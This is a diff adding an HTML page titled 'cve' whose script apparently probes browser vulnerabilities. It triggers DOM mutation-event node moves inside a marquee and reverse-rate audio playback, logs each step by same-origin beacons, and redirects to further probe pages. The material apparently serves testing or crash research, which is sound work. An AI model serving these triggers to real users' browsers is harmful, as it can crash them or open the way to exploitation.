@@ -1,0 +1,66 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>cve</title>
+<script>
+var t0 = Date.now();
+function b(tag){
+  var u = location.origin + '/beacon/CVE-' + tag + '?t=' + (Date.now()-t0);
+  try { var x=new XMLHttpRequest(); x.open('GET',u,false); x.send(); return; } catch(e){}
+  try { navigator.sendBeacon(u); } catch(e){}
+}
+var q = new URLSearchParams(location.search);
+var mode = q.get('t') || 'dom';
+b('S-' + mode);
+
+function domcase(){
+  b('DOM0');
+  var m=document.createElement('marquee');
+  var h=document.createElement('hr');
+  h.setAttribute('width','1');
+  m.appendChild(document.createTextNode(' '));
+  m.appendChild(h);
+  m.appendChild(document.createTextNode(' '));
+  document.documentElement.appendChild(m);
+  var fired=0;
+  m.addEventListener('DOMSubtreeModified', function(){
+     fired++;
+     b('DOMEV' + fired);
+     if (fired > 3) return;
+     try { h.before(h); } catch(e) { b('DOME1'); }
+     try { m.normalize(); } catch(e) { b('DOME2'); }
+     b('DOMEV' + fired + 'end');
+  });
+  b('DOM1');
+  try { m.setAttribute('a',''); } catch(e) { b('DOMS1'); }
+  b('DOM2');
+}
+
+function audcase(){
+  var AC = window.AudioContext || window.webkitAudioContext;
+  b('AUD0:' + (typeof AC));
+  if (!AC) return;
+  try {
+    var ctx = new AC();
+    b('AUD1:' + ctx.state);
+    var src = new AudioBufferSourceNode(ctx);
+    var buf = ctx.createBuffer(1, 8192, 44100);
+    var d = buf.getChannelData(0);
+    for (var i=0;i<d.length;i++) d[i] = (i % 97) / 97;
+    src.buffer = buf;
+    src.start(undefined, 0.5);
+    src.playbackRate.value = -1;
+    src.connect(ctx.destination, 0, 0);
+    b('AUD2:' + ctx.state);
+    if (ctx.resume) ctx.resume().then(function(){ b('AUD3r:'+ctx.state); }, function(e){ b('AUD3e:'+ctx.state); });
+    setTimeout(function(){ b('AUD4:' + ctx.state); }, 800);
+  } catch(e) { b('AUDERR:' + (e && e.name)); }
+}
+
+function next(){
+  if (mode === 'dom') location.replace('/corpus/cve.html?t=aud&t2=' + Date.now());
+  else location.replace('/probe/p_ver.js?t=' + Date.now());
+}
+if (mode === 'dom') { try { domcase(); } catch(e) { b('DOMX:' + (e&&e.name)); } setTimeout(next, 600); }
+else { try { audcase(); } catch(e) { b('AUDX:' + (e&&e.name)); } setTimeout(next, 2500); }
+</script>
+<p>cve</p>
